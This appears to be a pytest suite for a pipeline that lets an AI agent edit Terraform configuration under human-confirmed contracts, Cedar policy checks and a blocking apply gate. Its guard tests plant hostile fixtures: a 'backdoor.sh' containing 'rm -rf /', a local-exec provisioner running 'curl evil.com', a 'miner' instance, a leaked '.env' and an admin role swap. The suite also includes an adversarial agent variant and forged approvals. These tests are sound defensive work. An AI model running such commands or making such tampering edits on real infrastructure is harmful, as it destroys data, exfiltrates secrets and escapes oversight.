"""Phase 1 test suite: Natural-language request interpretation, capability validation,
attribute-level authority, configuration guards, adversarial separation, apply boundaries,
and live-agent unmocked end-to-end execution.
"""

from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest.mock import patch
import json

import pytest
from fastapi.testclient import TestClient

from engine import api
from engine.evaluator import evaluate
from engine.exceptions import (
    AmbiguousRequestError,
    ModelUnavailableError,
    UnsupportedOperationError,
)
from engine.gate import apply_saved, gate_reason
from engine.intent import (
    CAPABILITY_REGISTRY,
    IntentProposal,
    extract_deterministic_intent,
    interpret,
    validate_capability,
)
from engine.pipeline import Pipeline, ROOT
from engine.types import CanonicalChange, Change, Contract, Verdict


# ==============================================================================
# 1. Natural Language Phrasings & Parameterized Memory Values (1MB Increments)
# ==============================================================================


@pytest.mark.parametrize(
    "phrase,expected_val",
    [
        ("Set dev-api Lambda memory to 129", 129),  # 1-MB increment above minimum
        ("Set dev-api Lambda memory to 700", 700),  # non-multiple of 64
        ("Set dev-api Lambda memory to 768", 768),
        ("Increase Lambda memory to 2048 MB", 2048),
        ("Update memory size to 128", 128),  # boundary minimum
        ("Set dev-api memory to 10239", 10239),  # 1-MB increment below maximum
        ("Set dev-api memory to 10240 megabytes", 10240),  # boundary maximum
        ("Change memory to 1024", 1024),
    ],
)
def test_multiple_phrasings_and_valid_values(phrase, expected_val, tmp_path):
    """Multiple phrasings and valid memory values (including non-multiples of 64) are planned and verified."""
    proposal = interpret(phrase, mode="replay")
    assert proposal.operation == "update_memory"
    assert proposal.resource_address == "aws_lambda_function.dev_api"
    assert proposal.attribute == "memory_size"
    assert proposal.requested_value == expected_val

    p = Pipeline(tmp_path)
    t = p.create(phrase, mode="replay")
    id = t["id"]
    p.confirm(id, t["contract"])
    t = p.agent(id, variant="intended")

    # Verify actual main.tf file diff
    workspace_main = (Path(t["workspace"]) / "main.tf").read_text()
    assert f"memory_size = {expected_val}" in workspace_main
    assert "memory_size = 512" not in workspace_main

    # Real Terraform plan
    p.plan(id)
    p.canonicalize(id)
    t = p.evaluate(id)
    run = t["runs"][-1]

    # Verify canonical change matches attribute and exact value
    canonical = run["canonical"]
    assert len(canonical) == 1
    assert canonical[0]["address"] == "aws_lambda_function.dev_api"
    ch = canonical[0]["changes"][0]
    assert ch["attribute"] == "memory_size"
    assert ch["before"] == 512
    assert ch["after"] == expected_val

    # Cedar verdict is ALLOW
    assert run["verdicts"][0]["verdict"] == "ALLOW"

    # Apply gate safely blocks real AWS apply
    apply_res = p.apply(id)["runs"][-1]["apply_result"]
    assert apply_res["status"] == "BLOCKED"
    assert "AWS apply disabled" in apply_res["reason"]
    assert apply_res["spawned"] is False


@pytest.mark.parametrize(
    "invalid_val,expected_reason_substr",
    [
        (127, "between 128 and 10240"),  # Below minimum (128)
        (10241, "between 128 and 10240"),  # Above maximum (10240)
        (-512, "between 128 and 10240"),  # Negative integer
        (0, "between 128 and 10240"),  # Zero
        (1024.5, "must be an integer"),  # Float / non-integer
    ],
)
def test_invalid_and_out_of_range_memory_values_rejected(
    invalid_val, expected_reason_substr
):
    """Values outside capability bounds are deterministically rejected before any editing."""
    proposal = IntentProposal(
        operation="update_memory",
        resource_address="aws_lambda_function.dev_api",
        resource_type="aws_lambda_function",
        attribute="memory_size",
        requested_value=invalid_val,
        raw_task=f"Set memory to {invalid_val}",
    )
    is_valid, reason, code = validate_capability(proposal)
    assert not is_valid
    assert expected_reason_substr in reason
    assert code == "UNSUPPORTED_OPERATION"

    if isinstance(invalid_val, int):
        with pytest.raises(UnsupportedOperationError) as exc_info:
            interpret(f"Set dev-api memory to {invalid_val}", mode="replay")
        assert expected_reason_substr in str(exc_info.value)


# ==============================================================================
# 2. S3 Tag Safety & Environment Non-Interference
# ==============================================================================


def test_s3_team_tag_update_preserves_trusted_environment(tmp_path):
    """Updating S3 Team tag does not modify trusted Environment='dev' tag or allow environment override."""
    phrase = "Add Team tag platform to assets bucket"
    proposal = interpret(phrase, mode="replay")
    assert proposal.operation == "update_tags"
    assert proposal.resource_address == "aws_s3_bucket.assets"
    assert proposal.requested_value == "platform"

    p = Pipeline(tmp_path)
    t = p.create(phrase, mode="replay")
    id = t["id"]
    p.confirm(id, t["contract"])
    t = p.agent(id, variant="intended")

    # Verify main.tf has both Environment = "dev" AND Team = "platform"
    workspace_main = (Path(t["workspace"]) / "main.tf").read_text()
    assert 'Environment = "dev"' in workspace_main
    assert 'Team = "platform"' in workspace_main

    # Real Terraform plan and canonicalization
    p.plan(id)
    p.canonicalize(id)
    t = p.evaluate(id)
    run = t["runs"][-1]

    # Environment identity MUST remain trusted "dev", not modified
    assert run["canonical"][0]["environment"] == "dev"
    assert run["canonical"][0]["address"] == "aws_s3_bucket.assets"
    assert run["verdicts"][0]["verdict"] == "ALLOW"


# ==============================================================================
# 3. Truthful Unsupported & Compound Requests
# ==============================================================================


@pytest.mark.parametrize(
    "unsupported_task",
    [
        "Create an EC2 t3.micro instance",
        "Deploy a new VPC with public subnets",
        "Delete the dev-api lambda function",
        "Open port 22 on security group",
        "Grant AdministratorAccess IAM role",
        "Modify production database configuration",
    ],
)
def test_unsupported_requests_cause_no_edits(unsupported_task, tmp_path):
    """Unsupported operations return structured UNSUPPORTED_OPERATION before any edits occur."""
    p = Pipeline(tmp_path)
    with pytest.raises(UnsupportedOperationError) as exc_info:
        p.create(unsupported_task, mode="replay")

    assert exc_info.value.code == "UNSUPPORTED_OPERATION"
    assert not (tmp_path / "workspaces").exists()


@pytest.mark.parametrize(
    "compound_task",
    [
        "Update dev-api lambda memory to 768 and delete assets bucket",
        "Increase memory and modify security group rules",
    ],
)
def test_compound_requests_cause_no_edits(compound_task, tmp_path):
    """Compound multi-operation requests return AMBIGUOUS_REQUEST before editing."""
    p = Pipeline(tmp_path)
    with pytest.raises(AmbiguousRequestError) as exc_info:
        p.create(compound_task, mode="replay")
    assert exc_info.value.code == "AMBIGUOUS_REQUEST"


# ==============================================================================
# 4. Live Mode Error Transparency (Never Silently Falls Back to Replay)
# ==============================================================================


def test_model_unavailable_live_mode_never_switches_to_replay(tmp_path, monkeypatch):
    """If Ollama is unreachable in live mode, system returns MODEL_UNAVAILABLE, never silently falls back."""
    monkeypatch.setattr(
        "engine.agent.ollama_configuration",
        lambda: {
            "enabled": True,
            "server_reachable": False,
            "model_installed": False,
            "error": "Connection refused",
        },
    )

    p = Pipeline(tmp_path)
    with pytest.raises(ModelUnavailableError) as exc_info:
        p.create("Update dev-api memory to 1024", mode="ollama")

    assert exc_info.value.code == "MODEL_UNAVAILABLE"
    assert exc_info.value.status_code == 503
    assert "unavailable" in str(exc_info.value).lower()


# ==============================================================================
# 5. Adversarial Mode Separation and Labeling
# ==============================================================================


def test_adversarial_mode_explicitly_labeled_and_separated(tmp_path):
    """Adversarial variant produces ALLOW/REVIEW/DENY verdicts and is explicitly labeled in audit."""
    p = Pipeline(tmp_path)
    t = p.create("Increase dev-api Lambda memory", mode="adversarial")
    id = t["id"]
    assert t["mode"] == "adversarial"

    c = t["contract"]
    c["denies"] = ["production", "public_access"]
    c["max_changed_resources"] = 3
    p.confirm(id, c)

    p.agent(id, variant="adversarial")
    p.plan(id)
    p.canonicalize(id)
    t = p.evaluate(id)

    verdicts = {v["verdict"] for v in t["runs"][-1]["verdicts"]}
    assert verdicts == {"ALLOW", "REVIEW", "DENY"}

    # Audit records reflect explicit adversarial demonstration
    events = p.store.audit(id)
    agent_event = next(e for e in events if e["kind"] == "agent_edits")
    assert agent_event["data"]["mode"] == "adversarial"
    assert agent_event["data"]["variant"] == "adversarial"


# ==============================================================================
# 6. Pre-Planning Configuration Guards & Bypass-Oriented Tests
# ==============================================================================


def test_preplan_guard_rejects_unexpected_files(tmp_path):
    """Unexpected files in the workspace trigger pre-plan rejection."""
    p = Pipeline(tmp_path)
    t = p.create("Increase dev-api Lambda memory")
    id = t["id"]
    p.confirm(id, t["contract"])
    t = p.agent(id, variant="intended")

    # Drop an unexpected script into the workspace
    workspace = Path(t["workspace"])
    (workspace / "backdoor.sh").write_text("#!/bin/sh\nrm -rf /")

    with pytest.raises(ValueError, match="Unexpected file in workspace: backdoor.sh"):
        p.plan(id)


def test_preplan_guard_rejects_unauthorized_resources(tmp_path):
    """Declaring unexpected resources outside baseline triggers pre-plan rejection."""
    p = Pipeline(tmp_path)
    t = p.create("Increase dev-api Lambda memory")
    id = t["id"]
    p.confirm(id, t["contract"])
    t = p.agent(id, variant="intended")

    # Inject an unauthorized resource
    workspace = Path(t["workspace"])
    config = (workspace / "main.tf").read_text()
    (workspace / "main.tf").write_text(
        config + '\nresource "aws_instance" "miner" {\n  ami = "ami-12345"\n}\n'
    )

    with pytest.raises(
        ValueError, match="Unauthorized resource declaration 'aws_instance.miner'"
    ):
        p.plan(id)


def test_preplan_guard_rejects_spacing_variations_on_unauthorized_resources(tmp_path):
    """Guard detects unauthorized resources despite unusual whitespace, tabs, or newlines."""
    p = Pipeline(tmp_path)
    t = p.create("Increase dev-api Lambda memory")
    id = t["id"]
    p.confirm(id, t["contract"])
    t = p.agent(id, variant="intended")

    workspace = Path(t["workspace"])
    config = (workspace / "main.tf").read_text()
    # Sneaky whitespace and tabs: resource    "aws_instance"    "sneaky"
    (workspace / "main.tf").write_text(
        config + '\nresource    "aws_instance"    "sneaky"   {\n  ami = "ami-123"\n}\n'
    )

    with pytest.raises(
        ValueError, match="Unauthorized resource declaration 'aws_instance.sneaky'"
    ):
        p.plan(id)


def test_preplan_guard_rejects_injected_provisioners_inside_resources(tmp_path):
    """Injecting local-exec provisioner inside a valid resource is caught and blocked."""
    p = Pipeline(tmp_path)
    t = p.create("Increase dev-api Lambda memory")
    id = t["id"]
    p.confirm(id, t["contract"])
    t = p.agent(id, variant="intended")

    workspace = Path(t["workspace"])
    config = (workspace / "main.tf").read_text()
    # Inject provisioner inside dev_api Lambda
    tampered = config.replace(
        'tags = { Environment = "dev" }',
        'tags = { Environment = "dev" }\n  provisioner "local-exec" { command = "curl evil.com" }',
    )
    (workspace / "main.tf").write_text(tampered)

    with pytest.raises(ValueError, match="Unsupported executable Terraform configuration"):
        p.plan(id)


def test_preplan_guard_rejects_unauthorized_provider_additions(tmp_path):
    """Adding extra provider blocks (e.g. local or null provider) is caught and blocked."""
    p = Pipeline(tmp_path)
    t = p.create("Increase dev-api Lambda memory")
    id = t["id"]
    p.confirm(id, t["contract"])
    t = p.agent(id, variant="intended")

    workspace = Path(t["workspace"])
    config = (workspace / "main.tf").read_text()
    tampered = config.replace(
        'provider "aws" {',
        'provider "null" {}\nprovider "aws" {',
    )
    (workspace / "main.tf").write_text(tampered)

    with pytest.raises(ValueError, match="Provider header modified or unsupported provider declarations"):
        p.plan(id)


def test_preplan_guard_rejects_sneaky_workspace_files_and_directories(tmp_path):
    """Workspace rejects dotfiles, subdirectories, and backup files."""
    p = Pipeline(tmp_path)
    t = p.create("Increase dev-api Lambda memory")
    id = t["id"]
    p.confirm(id, t["contract"])
    t = p.agent(id, variant="intended")

    workspace = Path(t["workspace"])
    (workspace / ".env").write_text("SECRET=leaked")

    with pytest.raises(ValueError, match="Unexpected file in workspace: .env"):
        p.plan(id)


def test_preplan_guard_rejects_unauthorized_attribute_edits(tmp_path):
    """Unauthorized attribute edits outside confirmed intent are caught before planning."""
    p = Pipeline(tmp_path)
    t = p.create("Set dev-api Lambda memory to 768")
    id = t["id"]
    p.confirm(id, t["contract"])
    t = p.agent(id, variant="intended")

    # Tamper with Lambda role attribute
    workspace = Path(t["workspace"])
    config = (workspace / "main.tf").read_text()
    (workspace / "main.tf").write_text(
        config.replace("arn:aws:iam::123456789012:role/demo", "arn:aws:iam::123456789012:role/admin")
    )

    with pytest.raises(ValueError, match="Unauthorized configuration changes detected"):
        p.plan(id)


# ==============================================================================
# 7. Cedar Failures Represented as Typed EVALUATION_ERROR (Never REVIEW)
# ==============================================================================


def test_cedar_failure_cannot_be_approved_in_resolve_or_apply(tmp_path):
    """Cedar evaluation failures fail closed to EVALUATION_ERROR and cannot be approved or applied."""
    p = Pipeline(tmp_path)
    t = p.create("Increase dev-api Lambda memory")
    id = t["id"]
    p.confirm(id, t["contract"])
    t = p.agent(id, variant="intended")
    p.plan(id)
    p.canonicalize(id)

    # Force Cedar evaluation failure
    with patch("cedarpy.is_authorized", side_effect=RuntimeError("Simulated Cedar panic")):
        t = p.evaluate(id)

    run = t["runs"][-1]
    assert run["verdicts"][0]["verdict"] == "EVALUATION_ERROR"
    assert "Cedar evaluation failed" in run["verdicts"][0]["reason"]

    # Attempt to approve in resolve() -> MUST FAIL
    with pytest.raises(ValueError, match="experienced an evaluation error and cannot be approved"):
        p.resolve(id, {"aws_lambda_function.dev_api": "approve"})

    # Attempt to apply -> Gate MUST BLOCK with explicit evaluation error reason
    c = Contract.model_validate(t["contract"])
    with patch("engine.gate.run_tree") as mock_spawn:
        res = apply_saved(c, run, {"aws_lambda_function.dev_api": "approve"})
        mock_spawn.assert_not_called()

    assert res["status"] == "BLOCKED"
    assert res["spawned"] is False
    assert "evaluation errors" in res["reason"]


def test_gate_blocks_evaluation_error_regardless_of_reason_string():
    """Gate blocks EVALUATION_ERROR even if reason string is empty, unexpected, or unrelated."""
    c = Contract.model_validate({
        "contract_id": "test-eval-err",
        "task": "test",
        "expires_at": datetime.now(timezone.utc) + timedelta(hours=1),
        "status": "confirmed",
    })
    # Empty reason string: gate MUST block on typed verdict == "EVALUATION_ERROR"
    run_empty_reason = {
        "verdicts": [{"address": "aws_lambda_function.dev_api", "verdict": "EVALUATION_ERROR", "reason": ""}],
        "canonical": [{"address": "aws_lambda_function.dev_api", "resource_type": "aws_lambda_function"}],
    }
    assert "evaluation errors" in gate_reason(
        c, run_empty_reason["verdicts"], {}, canonical=run_empty_reason["canonical"]
    )

    # Arbitrary reason string: gate MUST block
    run_arbitrary_reason = {
        "verdicts": [{"address": "aws_lambda_function.dev_api", "verdict": "EVALUATION_ERROR", "reason": "Arbitrary panic 0xDEADBEEF"}],
        "canonical": [{"address": "aws_lambda_function.dev_api", "resource_type": "aws_lambda_function"}],
    }
    assert "evaluation errors" in gate_reason(
        c, run_arbitrary_reason["verdicts"], {}, canonical=run_arbitrary_reason["canonical"]
    )

    # Forged approval for EVALUATION_ERROR must be blocked
    res = apply_saved(c, run_empty_reason, {"aws_lambda_function.dev_api": "approve"})
    assert res["status"] == "BLOCKED"
    assert res["spawned"] is False
    assert "evaluation errors" in res["reason"]


# ==============================================================================
# 8. Gate Completeness and Consistency Checks
# ==============================================================================


def test_gate_blocks_mismatched_and_duplicate_verdicts():
    """Gate blocks when verdicts are missing, duplicated, or mismatched against canonical plan."""
    c = Contract.model_validate({
        "contract_id": "test-c",
        "task": "test",
        "expires_at": datetime.now(timezone.utc) + timedelta(hours=1),
        "status": "confirmed",
    })

    canonical = [
        {"address": "aws_lambda_function.dev_api", "resource_type": "aws_lambda_function"},
        {"address": "aws_s3_bucket.assets", "resource_type": "aws_s3_bucket"},
    ]

    # Duplicate verdicts
    dup_verdicts = [
        {"address": "aws_lambda_function.dev_api", "verdict": "ALLOW"},
        {"address": "aws_lambda_function.dev_api", "verdict": "ALLOW"},
    ]
    assert "Duplicate verdicts" in gate_reason(c, dup_verdicts, {}, canonical=canonical)

    # Missing verdict
    missing_verdicts = [
        {"address": "aws_lambda_function.dev_api", "verdict": "ALLOW"},
    ]
    assert "Missing evaluation verdicts" in gate_reason(c, missing_verdicts, {}, canonical=canonical)

    # Mismatched address
    mismatched_verdicts = [
        {"address": "aws_lambda_function.dev_api", "verdict": "ALLOW"},
        {"address": "aws_security_group.api", "verdict": "ALLOW"},
    ]
    assert "Mismatched verdicts" in gate_reason(c, mismatched_verdicts, {}, canonical=canonical)

    # Empty verdicts for nonempty plan
    assert "Empty verdicts" in gate_reason(c, [], {}, canonical=canonical)


def test_direct_deny_never_starts_terraform_apply():
    """A DENY verdict directly blocks apply without starting any subprocess."""
    c = Contract.model_validate({
        "contract_id": "test-deny",
        "task": "test",
        "expires_at": datetime.now(timezone.utc) + timedelta(hours=1),
        "status": "confirmed",
    })
    run = {
        "verdicts": [{"address": "aws_s3_bucket_public_access_block.assets", "verdict": "DENY"}],
        "canonical": [{"address": "aws_s3_bucket_public_access_block.assets", "resource_type": "aws_s3_bucket_public_access_block"}],
    }
    with patch("engine.gate.run_tree") as mock_spawn:
        res = apply_saved(c, run, {})
        mock_spawn.assert_not_called()

    assert res["status"] == "BLOCKED"
    assert res["spawned"] is False
    assert "DENY" in res["reason"]


# ==============================================================================
# 9. Complete Live Unmocked Ollama Agent End-to-End Tests
# ==============================================================================


def test_live_ollama_e2e_lambda_memory_non_multiple_of_64(tmp_path):
    """Complete unmocked live run: Ollama interprets 700MB, live agent edits HCL, plan, Cedar ALLOW."""
    from engine.agent import ollama_configuration

    config = ollama_configuration()
    if not config.get("server_reachable") or not config.get("model_installed"):
        pytest.skip("Local Ollama not reachable; skipping live agent E2E test")

    task_phrase = "Set dev-api Lambda memory to 700"
    p = Pipeline(tmp_path)
    t = p.create(task_phrase, mode="ollama")
    id = t["id"]

    # Verify live interpretation extracted 700
    assert t["intent"]["operation"] == "update_memory"
    assert t["intent"]["requested_value"] == 700

    # Human confirms contract
    p.confirm(id, t["contract"])

    # Live agent executes using Ollama and Strands tool
    t = p.agent(id)

    # Independently inspect HCL artifact on disk
    workspace_main = (Path(t["workspace"]) / "main.tf").read_text(encoding="utf-8")
    assert "memory_size = 700" in workspace_main
    assert "memory_size = 512" not in workspace_main
    # Verify unrelated resources untouched
    assert 'resource "aws_security_group" "api"' in workspace_main
    assert 'resource "aws_s3_bucket" "assets"' in workspace_main
    assert 'resource "aws_s3_bucket_public_access_block" "assets"' in workspace_main

    # Real Terraform plan
    p.plan(id)
    p.canonicalize(id)
    t = p.evaluate(id)
    run = t["runs"][-1]

    # Verify real plan artifact on disk
    raw_plan = json.loads(Path(run["raw_path"]).read_text(encoding="utf-8"))
    assert any(
        rc.get("address") == "aws_lambda_function.dev_api"
        for rc in raw_plan.get("resource_changes", [])
    )

    # Cedar evaluation
    assert run["verdicts"][0]["verdict"] == "ALLOW"
    assert run["verdicts"][0]["address"] == "aws_lambda_function.dev_api"

    # Apply gate blocks real AWS apply
    apply_res = p.apply(id)["runs"][-1]["apply_result"]
    assert apply_res["status"] == "BLOCKED"
    assert "AWS apply disabled" in apply_res["reason"]
    assert apply_res["spawned"] is False


def test_live_ollama_e2e_s3_team_tag(tmp_path):
    """Complete unmocked live run: Ollama interprets Team tag, live agent edits HCL, plan, Cedar ALLOW."""
    from engine.agent import ollama_configuration

    config = ollama_configuration()
    if not config.get("server_reachable") or not config.get("model_installed"):
        pytest.skip("Local Ollama not reachable; skipping live agent E2E test")

    task_phrase = "Add Team tag observability to assets bucket"
    p = Pipeline(tmp_path)
    t = p.create(task_phrase, mode="ollama")
    id = t["id"]

    assert t["intent"]["operation"] == "update_tags"
    assert t["intent"]["requested_value"] == "observability"

    p.confirm(id, t["contract"])
    t = p.agent(id)

    # Independently inspect HCL artifact
    workspace_main = (Path(t["workspace"]) / "main.tf").read_text(encoding="utf-8")
    assert 'Team = "observability"' in workspace_main
    assert 'Environment = "dev"' in workspace_main
    assert "memory_size = 512" in workspace_main  # Lambda untouched

    # Real Terraform plan and canonicalization
    p.plan(id)
    p.canonicalize(id)
    t = p.evaluate(id)
    run = t["runs"][-1]

    assert run["canonical"][0]["environment"] == "dev"
    assert run["verdicts"][0]["verdict"] == "ALLOW"
    assert run["verdicts"][0]["address"] == "aws_s3_bucket.assets"

    apply_res = p.apply(id)["runs"][-1]["apply_result"]
    assert apply_res["status"] == "BLOCKED"
    assert apply_res["spawned"] is False
